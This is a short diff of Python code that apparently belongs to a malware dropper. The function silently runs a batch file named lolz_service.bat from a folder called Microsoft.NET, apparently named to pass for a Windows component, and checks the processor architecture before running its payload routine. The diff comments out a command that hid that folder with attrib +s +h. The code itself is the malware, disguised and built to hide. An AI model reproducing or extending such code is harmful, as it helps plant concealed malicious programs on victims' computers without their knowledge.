@@ -49,7 +49,7 @@ def fire_things_up(url,arch=False,zip=False):
 			xxx = subprocess.Popen( pthhhh+"\\Microsoft.NET\\lolz_service.bat >> NUL",shell=True)
 
 		#xx  = subprocess.Popen( "library.exe >> NUL",shell=True,cwd=pthhhh+"\\Microsoft.NET")
-		xxx = subprocess.Popen( 'attrib +s +h "Microsoft.NET" >> NUL',shell=True,cwd=pthhhh)
+		#xxx = subprocess.Popen( 'attrib +s +h "Microsoft.NET" >> NUL',shell=True,cwd=pthhhh)
 	#check architecture
 	if arch:
 		if architecture()[0][:2] == arch: work(zip)
